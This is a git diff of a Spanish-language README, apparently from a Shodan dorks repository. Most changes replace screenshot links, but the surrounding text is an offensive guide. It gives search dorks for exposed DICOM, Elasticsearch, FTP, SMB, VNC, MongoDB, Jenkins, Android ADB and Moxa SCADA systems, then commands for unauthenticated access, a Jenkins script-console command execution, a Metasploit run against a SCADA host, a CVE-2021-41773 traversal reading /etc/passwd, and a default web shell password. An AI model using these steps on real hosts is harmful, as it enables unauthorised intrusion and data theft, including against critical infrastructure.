@@ -11,11 +11,9 @@ El estándar DICOM (Digital Imaging and Communications in Medicine) es un están
 ```sh
 python3 Dicom.py
 ```
+![1](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/6da5ac61-5408-47e7-b875-ab64f5dbb8a7)
 
-![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/29f923e0-fbde-4526-a199-fbf71cb5319f)
-
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/15e42afa-c7ba-44e0-a2fd-1c8dc6a829d5)
-
+![2](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/464e7bf2-8873-45e3-83c4-920f5cc68966)
 
 # Elasticsearch
 Elasticsearch es un motor de búsqueda y análisis distribuido, de código abierto, basado en Lucene. Se utiliza para indexar, buscar y analizar grandes volúmenes de datos en tiempo real. Está diseñado para manejar datos no estructurados o semiestructurados y es especialmente útil para casos de uso en los que se requiere búsqueda y análisis de texto, logística, monitoreo y análisis de registros, y más
@@ -32,8 +30,7 @@ curl -X GET "http://192.x.x.153:9200/_search?pretty=true"
 ```sh
 python3 elastic.py -t 192.x.x.153
 ```
-![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/25dadba2-91d2-4bc6-9a91-6c238120d557)
-
+![3](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/000ddad0-49fd-476d-b1cd-bc3802399c39)
 
 ## Access FTP Anonymous
 El acceso FTP anónimo es una forma de conectarse a un servidor FTP sin proporcionar credenciales de autenticación específicas.
@@ -50,8 +47,7 @@ shodan search :"220" "230 Login successful." port:21 --fields ip_str --separator
 ```sh
 python3 ftp.py -l ips.txt
 ```
-![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/59945aef-9d89-4c2d-bbc6-a876ad1ed68d)
-
+![4](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/57453843-fda0-4dcc-a6e1-49157674de94)
 
 # Authentication Disabled SMB
 La autenticación SMB (Server Message Block) sin credenciales, también conocida como acceso SMB anónimo, permite a los usuarios acceder a recursos compartidos en una red sin proporcionar nombres de usuario ni contraseñas. Esto puede ser útil para acceder a carpetas compartidas que se han configurado para permitir el acceso anónimo.
@@ -63,7 +59,7 @@ La autenticación SMB (Server Message Block) sin credenciales, también conocida
 smbclient -L //200.x.x.29/ -N  
 smbclient //200.x.x.29/info
 ```
-![image](https://github.com/HernanRodriguez1/Exploits-Shodan/assets/66162160/da427f4b-0f7b-4f2b-9b0e-326da7e78420)
+![5](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/31b2ba83-2255-418c-83c1-d0860c957a1c)
 
 ## Access authentication disabled VNC
 Esto significa que el servidor VNC está configurado para permitir conexiones sin requerir autenticación.
@@ -74,12 +70,10 @@ Esto significa que el servidor VNC está configurado para permitir conexiones si
 ```sh
 vncviewer -passwd none 91.x.x.238
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e610141-1ccf-4388-92c5-c824704ca9c0)
-
+![6](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/7e9aa869-aa84-4277-b207-48f91caf90f3)
 
 ## Access authentication disabled MongoDB
 Esto significa que el servidor NoSQL MongoDB está configurado para permitir conexiones sin requerir autenticación.
-
 
 ```sh
 "MongoDB Server Information" port:27017 -authentication
@@ -88,7 +82,7 @@ Esto significa que el servidor NoSQL MongoDB está configurado para permitir con
 ```sh
 mongo --host 139.x.x.5
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/69a9b077-8f19-4c3b-8032-0b6387c93c8b)
+![7](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/2f5f6056-fe19-4914-a794-7d7a85bec742)
 
 ## Access Jenkins
 Se puede visualizar componentes del servicio Jenkins, ejecutar scripts, etc.
@@ -102,8 +96,7 @@ html:"Dashboard Jenkins"
 add /script 
 print "uname -a".execute().text
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/96d36829-5013-4bdb-b543-f095a0835dc3)
-
+![8](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5c1b5452-bf20-4857-b00f-d3255453825f)
 
 ## Access devices ADB
 Es una aplicación de terminal que le permite conectarse al servicio ADB shell de otros dispositivos Android a través de la red.
@@ -114,17 +107,18 @@ shodan search :Android Debug Bridge port:5555 "Name:" --fields ip_str --separato
 ```sh
 python3 adb.py   
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/da53ed42-de05-4842-9662-5ee57eaf6269)
+![9](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/1a5484f7-55ff-4db6-ab0e-22cf6ff2c018)
 
 ```sh
 adb devices
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e05b583-b684-4b27-b42d-c10b5312d788)
+![10](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/7e32e586-a2c6-48e0-b173-bd6f4768148b)
 
 ```sh
 adb -s 59.x.x.112:5555 shell
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/e2bf07c6-157a-4fac-b4e5-f317e6ced25f)
+![11](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/808b7528-01f9-4bbe-8613-85c0b87496cb)
+
 
 ## Access devices SCADA Moxa 
 Sistema SCADA que utiliza productos de la marca Moxa para establecer la conectividad y la comunicación con los dispositivos industriales que están siendo monitoreados y controlados en una infraestructura crítica o proceso industrial.
@@ -142,12 +136,12 @@ set rport 4800
 set rhosts 212.x.x.14
 run
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/54060261-80cc-4893-b134-b3fe2e0bc62c)
+![12](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/994f2250-28e1-4cd9-a113-c7a90c11c92e)
 
 ```sh
 telnet 212.x.x.14
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5f79db0b-aff5-4790-8c9a-59f0b84c59d4)
+![13](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/90258052-da22-40bb-80e2-908a4dff8af3)
 
 ## Exploit Infrastructure RCE CVE-2020-0796
 La vulnerabilidad CVE-2020-0796 se refiere a una vulnerabilidad de ejecución de código remoto (RCE, por sus siglas en inglés) que afecta al protocolo de compartición de archivos SMBv3 (Server Message Block version 3). SMB es un protocolo utilizado para compartir archivos, impresoras y otros recursos en redes de computadoras. La versión 3 (SMBv3) es una versión moderna de este protocolo utilizada en sistemas operativos Windows.
@@ -158,20 +152,20 @@ Esta vulnerabilidad se conoció coloquialmente como "SMBGhost" o "CoronaBlue" y 
 vuln:CVE-2020-0796
 country:pe port:445
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9719b22e-f451-41ed-8a69-c90917116eee)
+![14](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/78132a91-52f4-4285-862f-b6367ffd9a52)
 
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/5067e96e-1031-413b-87ed-447568d5102b)
+![15](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/05606a90-4828-491e-8fc7-b34eea27d5eb)
 
 ## Exploit Web RCE CVE-2021-41773
 ```sh
 shodan search :apache 2.4.49  --fields ip_str,port --separator " " | awk '{print $1":"$2}' | cat > url.txt
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/ec13f8db-9b99-4be4-af6e-5000fd99d1c9)
+![16](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/ce43c1a0-047e-45c3-8a2c-eb18efce51f1)
 
 ```sh
 curl -k http://210.x.x.7/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd 
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/bb853581-a88d-4f88-92b8-1e89461ee0ad)
+![17](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/9e40e0b5-a665-4133-a61f-5e2c69fb0310)
 
 
 ## Electronic measure
@@ -179,19 +173,19 @@ curl -k http://210.x.x.7/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
 ```sh
 "Server: EIG Embedded Web Server" "200 Document follows"
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/e3960f20-02a7-4160-b0f5-1109b6a20995)
-
+![18](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/b93bf1c7-af97-4152-9c38-85d907a083c7)
 
 ## Search Web shell 
 
 ```sh
 html:"wso.php"
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/de293e71-053d-433a-a7a3-7f3dd9dc9d17)
+![19](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/0f2644f7-75e6-46eb-992f-5a3f9c41f185)
 
 webshell as default fa769dac7a0a94ee47d8ebe021eaba9e has a match password ghost287
 
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/045f69c7-f7be-4130-914f-2c714b623dc6)
+![20](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/668c181b-9040-489a-b074-a6f3e3fdc049)
+
 
 ## Search Backup Files
 
@@ -199,7 +193,8 @@ webshell as default fa769dac7a0a94ee47d8ebe021eaba9e has a match password ghost2
 html:"web.zip"
 "web.zip"
 ```
-![image](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/6c0e4d42-2378-433e-a4b9-784fb7d5a5b6)
+![21](https://github.com/HernanRodriguez1/Dorks-Shodan-2023/assets/66162160/357e77a7-25b8-4d22-893c-caf382bd18a1)
+
 
 
 ## OS Windows Obsolete
